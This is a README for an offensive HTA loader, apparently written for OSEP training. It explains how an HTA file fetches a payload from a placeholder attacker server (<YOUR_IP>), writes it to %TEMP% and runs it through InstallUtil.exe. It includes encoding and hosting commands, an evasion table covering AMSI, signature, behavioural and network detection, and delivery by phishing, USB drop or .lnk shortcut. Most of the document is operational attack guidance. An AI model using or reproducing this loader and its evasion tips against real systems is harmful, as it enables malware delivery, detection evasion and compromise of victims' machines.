# HTTP-Download + Self-Decode HTA

HTA that downloads a payload over HTTP and executes it via `InstallUtil.exe /U` — no embedded Base64 to copy-paste, no `certutil`, no `bitsadmin`, no PowerShell. The HTA file stays ~2KB regardless of payload size.

## Files

| File | What it downloads | Encoding step required |
|---|---|---|
| `loader.hta` | `loader.b64` (Base64 text) | `certutil -encode loader.exe loader.b64` |
| `loader-raw.hta` | `loader.exe` (raw binary) | None — host the EXE directly |

## Evasion profile

| Layer | Status |
|-------|--------|
| AMSI | Not applicable (VBScript HTA, no PowerShell) |
| Signature | Payload is downloaded at runtime — HTA file is ~2KB with no embedded payload |
| Behavioral | `MSXML2.XMLHTTP` + `ADODB.Stream` are COM objects, not monitored LOLBins |
| Network | HTTP download with browser User-Agent — blends in with normal web traffic |

## Usage

### loader.hta (Base64 download — bypasses content inspection)

1. Compile your InstallUtil loader (see `../../installutil/section-injection/`)
2. Base64-encode it:
   ```batch
   certutil -encode loader.exe loader.b64
   ```
   **Note**: `certutil -encode` adds PEM headers (`-----BEGIN CERTIFICATE-----`).
   The HTA strips these automatically — no manual cleanup needed.
   Alternatively, use PowerShell for raw Base64 (no PEM headers):
   ```powershell
   [Convert]::ToBase64String([IO.File]::ReadAllBytes("loader.exe")) | Out-File loader.b64 -Encoding ASCII
   ```
3. Host `loader.b64` on your HTTP server:
   ```bash
   python3 -m http.server 80
   ```
4. Edit `loader.hta` and set `payloadUrl`:
   ```vbscript
   Dim payloadUrl : payloadUrl = "http://<YOUR_IP>/loader.b64"
   ```
5. Deliver the HTA to the target (email attachment, USB drop, `.lnk` shortcut, phishing page, etc.)

### loader-raw.hta (Raw binary download — simplest)

1. Compile your InstallUtil loader
2. Host `loader.exe` directly on your HTTP server (no encoding needed)
3. Edit `loader-raw.hta` and set `payloadUrl`:
   ```vbscript
   Dim payloadUrl : payloadUrl = "http://<YOUR_IP>/loader.exe"
   ```
4. Deliver the HTA to the target

## How it works (loader.hta)

```
1. HTA loads → MSXML2.XMLHTTP downloads Base64 text from payloadUrl
2. MSXML2.DOMDocument decodes Base64 → byte array
3. ADODB.Stream writes bytes to %TEMP%\svc.exe
4. WScript.Shell runs: InstallUtil.exe /U %TEMP%\svc.exe
5. HTA window closes
```

## How it works (loader-raw.hta)

```
1. HTA loads → MSXML2.XMLHTTP downloads raw EXE bytes (responseBody)
2. ADODB.Stream writes bytes to %TEMP%\svc.exe
3. WScript.Shell runs: InstallUtil.exe /U %TEMP%\svc.exe
4. HTA window closes
```

## loader.hta vs loader-raw.hta

| | `loader.hta` (b64) | `loader-raw.hta` (raw) |
|---|---|---|
| Encoding step | `certutil -encode` | None |
| Content inspection | Bypassed (b64 looks like text) | May trigger binary content scans |
| File size on server | ~1.33x EXE size | EXE size |
| Complexity | One extra decode step | Simplest |

## Comparison with other HTA methods

| Method | Download | Decode | Write | Execute | HTA size |
|--------|----------|--------|-------|---------|----------|
| `self-decode-method/` | Embedded b64 | MSXML2 | ADODB.Stream | InstallUtil | ~1.33x payload |
| `certutil-method/` | certutil | certutil | certutil | InstallUtil | ~2KB |
| **`http-decode-method/`** | **MSXML2.XMLHTTP** | **MSXML2** | **ADODB.Stream** | **InstallUtil** | **~2KB** |
| `black.hta` | bitsadmin | certutil | certutil | InstallUtil | ~1KB |

## OSEP notes

- **Why not certutil-method?** `certutil` is a heavily monitored LOLBin. This method uses only COM objects (`MSXML2.XMLHTTP`, `MSXML2.DOMDocument`, `ADODB.Stream`) which are not LOLBins and generate less telemetry.
- **Why not self-decode-method?** Embedding b64 makes the HTA file huge (~1.33x payload) and causes formatting issues when copy-pasting. This method keeps the HTA at ~2KB.
- **Proxy**: `MSXML2.XMLHTTP` uses WinInet and respects system proxy settings. If the target is behind a proxy, this works automatically.
- **HTTPS**: Change `payloadUrl` to `https://...` — `MSXML2.XMLHTTP` supports TLS. For OSEP labs, HTTP is fine.
- **User-Agent**: Already set to a Chrome browser UA. Change it if you need to blend into a specific environment.
- **Delivery**: Works with any HTA delivery vector — email attachment, `.lnk` shortcut pointing to `mshta.exe loader.hta`, USB drop, or a phishing page with an `mshta` URL.

## Limitations

- `mshta.exe` itself is monitored by some EDRs — the HTA application tag helps blend in
- HTTP download is visible in proxy logs — the browser User-Agent helps but the connection itself is logged
- If your HTTP server is down or the URL changes, the HTA fails silently (no fallback)
- `loader-raw.hta` sends binary content over HTTP — some proxies/AV perform content inspection on binary responses; use `loader.hta` (b64) if this is a concern